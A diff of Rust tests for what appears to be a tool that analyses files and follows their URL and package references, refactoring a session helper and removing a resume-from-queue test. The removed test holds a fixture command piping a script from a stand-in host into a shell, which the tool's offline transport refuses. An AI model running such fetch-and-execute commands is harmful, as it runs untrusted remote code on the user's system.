@@ -172,7 +172,6 @@ fn real_compact_archive_retains_local_identity_entry_points_and_install_hooks() 
             depth: 1,
             ..FetchPolicy::default()
         },
-        None,
     );
     pass.run(
         &mut supplied,
@@ -208,19 +207,13 @@ fn report(prefix: &str, entry: &str, code: bool) -> AnalysisReport {
     }
     serde_json::from_value(serde_json::json!({"version":"3","files":files})).unwrap()
 }
-fn session(
-    report: &AnalysisReport,
-    policy: FetchPolicy,
-    store: Option<Arc<pending::Store>>,
-) -> FetchSession {
+fn session(report: &AnalysisReport, policy: FetchPolicy) -> FetchSession {
     static RESOURCES: OnceLock<Resources> = OnceLock::new();
     let resources = RESOURCES.get_or_init(|| Resources {
-        net: Box::new(super::tests_offline::Offline),
-        cache: super::tests_offline::cache(),
+        net: Box::new(super::offline::Offline),
+        cache: super::offline::cache(),
     });
-    let mut session = FetchSession::new(report, &[], resources, Follow::quiet(policy));
-    session.pending = store;
-    session
+    FetchSession::new(report, &[], resources, Follow::quiet(policy), None)
 }
 #[test]
 fn unresolved_downloader_records_survive_an_empty_worklist_and_deduplicate() {
@@ -231,11 +224,7 @@ fn unresolved_downloader_records_survive_an_empty_worklist_and_deduplicate() {
     let mut report: AnalysisReport = serde_json::from_value(serde_json::json!({"version":"3","files":[
             {"id":0,"path":"root.sh","depth":0,"file_type":"shell","sha256":"a".repeat(64),"size":script.len(),"filefacts":{"symbols":parsed.symbols()}}
         ]})).unwrap();
-    let mut session = session(
-        &report,
-        FetchPolicy::parse_follow("references").unwrap(),
-        None,
-    );
+    let mut session = session(&report, FetchPolicy::parse_follow("references").unwrap());
     session.record_unresolved_fetch_calls(&report);
     session.record_unresolved_fetch_calls(&report);
     session.run(&mut report, Vec::new());
@@ -259,7 +248,7 @@ fn unresolved_maven_declarations_survive_empty_worklists_and_deduplicate() {
              "filefacts":{"values":{"jar":{"pom":{"dependency_gaps":[{"member":"META-INF/maven/g/a/pom.xml","reason":"g:library: version requires unresolved property/parent/dependencyManagement/BOM"}]}}}}}
         ]})).unwrap();
     let policy = FetchPolicy::parse_follow("dependencies").unwrap();
-    let mut session = session(&report, policy, None);
+    let mut session = session(&report, policy);
     session.record_unresolved_fetch_calls(&report);
     session.record_unresolved_fetch_calls(&report);
     session.run(&mut report, Vec::new());
@@ -328,11 +317,7 @@ fn unverified_python_candidate_and_registry_do_not_poison_the_importer() {
             corpus: None,
         })],
     };
-    let mut pass = session(
-        &importer,
-        FetchPolicy::parse_follow("references").unwrap(),
-        None,
-    );
+    let mut pass = session(&importer, FetchPolicy::parse_follow("references").unwrap());
     let mut next = Vec::new();
     pass.merge_group(&mut importer, group, analysis, &mut next);
     assert_eq!(
@@ -483,7 +468,6 @@ fn supplied_unpinned_code_is_recorded_without_claiming_integrity() {
             depth: 1,
             ..FetchPolicy::default()
         },
-        None,
     );
     pass.run(&mut supplied, vec![("source".into(), vec![reference()])]);
     let records = pass.finish(&mut supplied).records;
@@ -518,126 +502,9 @@ fn development_scope_does_not_outrank_runtime_unless_it_executes_hooks() {
     assert!(dependency_execution_priority(&runtime) < dependency_execution_priority(&dev));
     dev.context.as_mut().unwrap().has_install_script = true;
     assert!(dependency_execution_priority(&dev) < dependency_execution_priority(&runtime));
-    let supplied = report("bundle", "missing.js", false);
-    let mut pass = session(
-        &supplied,
-        FetchPolicy {
-            deps: true,
-            include_dev_dependencies: false,
-            ..FetchPolicy::default()
-        },
-        None,
-    );
-    assert!(pass.select("source", vec![dev], 0, &mut 0).is_empty());
-    assert!(
-        pass.out.records[0]
-            .coverage
-            .iter()
-            .any(|fact| matches!(fact, Coverage::DevelopmentExcluded))
-    );
 }
 #[test]
-fn resumed_work_keeps_depth_pins_and_source_and_does_not_bypass_ci_scope() {
-    let dir = tempfile::tempdir().unwrap();
-    let store = Arc::new(pending::Store::open(&dir.path().join("queue")).unwrap());
-    let mut supplied = report("bundle", "missing.js", false);
-    let mut r = Reference::new(
-        RefLocator::Url("http://stage.example.test/stage.sh".into()),
-        RefKind::Command,
-        "shell",
-        "curl http://stage.example.test/stage.sh | sh",
-    );
-    r.offset = Some(17);
-    r.pinned_hash = Some(filefacts::PinnedHash {
-        algo: filefacts::HashAlgo::Sha256,
-        value: "a".repeat(64),
-    });
-    let entry = pending::Entry {
-        root_sha: "source".into(),
-        source_sha: "original-parent".into(),
-        hop: 3,
-        reference: r.clone(),
-        reason: "depth limit".into(),
-        redirect_credit: 0,
-    };
-    store.update(std::slice::from_ref(&entry), &[]).unwrap();
-    let mut pass = session(
-        &supplied,
-        FetchPolicy {
-            urls: true,
-            packages: true,
-            depth: 2,
-            ..FetchPolicy::default()
-        },
-        Some(store.clone()),
-    );
-    pass.run(&mut supplied, vec![]);
-    assert!(!pass.out.records.is_empty());
-    assert!(
-        pass.out.records[0]
-            .coverage
-            .iter()
-            .any(|fact| matches!(fact, Coverage::Pending { hop: 3, .. }))
-    );
-    let saved = store.entries("source").unwrap();
-    assert_eq!(saved.len(), 1);
-    assert_eq!(saved[0].reference, r);
-    // Widening depth tries the same URL; the offline transport refuses it.
-    let mut pass = session(
-        &supplied,
-        FetchPolicy {
-            urls: true,
-            packages: true,
-            depth: 4,
-            ..FetchPolicy::default()
-        },
-        Some(store.clone()),
-    );
-    pass.run(&mut supplied, vec![]);
-    assert_eq!(
-        pass.out.records[0].source_sha256.as_deref(),
-        Some("original-parent")
-    );
-    assert_eq!(pass.out.records[0].source_offset, Some(17));
-    assert!(matches!(
-        pass.out.records[0].outcome,
-        Outcome::Failed(FetchError::Refused(_))
-    ));
-    assert!(store.entries("source").unwrap().is_empty());
-    r.context = Some(filefacts::DependencyContext {
-        scope: filefacts::DependencyScope::Ci,
-        optional: false,
-        has_install_script: false,
-        installed_path: None,
-    });
-    store
-        .update(
-            &[pending::Entry {
-                reference: r,
-                hop: 0,
-                ..entry
-            }],
-            &[],
-        )
-        .unwrap();
-    let mut pass = session(
-        &supplied,
-        FetchPolicy {
-            urls: true,
-            packages: true,
-            ci: false,
-            ..FetchPolicy::default()
-        },
-        Some(store.clone()),
-    );
-    pass.run(&mut supplied, vec![]);
-    assert!(pass.out.records.is_empty());
-    assert_eq!(store.entries("source").unwrap().len(), 1);
-}
-#[test]
-fn timeout_defers_unvisited_references_and_keeps_integrity() {
-    let dir = tempfile::tempdir().unwrap();
-    let store = Arc::new(pending::Store::open(&dir.path().join("queue")).unwrap());
+fn timeout_defers_unvisited_references() {
     let mut supplied = report("bundle", "index.js", true);
     let mut r = reference();
     r.pinned_hash = Some(filefacts::PinnedHash {
@@ -650,7 +517,6 @@ fn timeout_defers_unvisited_references_and_keeps_integrity() {
             deps: true,
             ..FetchPolicy::default()
         },
-        Some(store.clone()),
     );
     pass.deadline.at = Some(Instant::now());
     pass.run(&mut supplied, vec![("source".into(), vec![r.clone()])]);
@@ -659,7 +525,6 @@ fn timeout_defers_unvisited_references_and_keeps_integrity() {
             |fact| matches!(fact, Coverage::Pending { reason, .. } if reason == "fetch timeout")
         )
     );
-    assert_eq!(store.entries("source").unwrap()[0].reference, r);
 }
 #[test]
 fn conflicting_pins_have_distinct_fetch_work_keys() {
@@ -760,13 +625,12 @@ fn exact_local_yarn_workspace_does_not_resolve_to_registry() {
         .workspace_coverage(&incomplete_report, &app_sha, reference)
         .unwrap();
     assert!(
-        coverage.1,
+        coverage.incomplete,
         "a local package with analysis gaps must remain incomplete"
     );
     let mut pass = session(
         &incomplete_report,
         FetchPolicy::parse_follow("dependencies").unwrap(),
-        None,
     );
     pass.run(
         &mut incomplete_report,
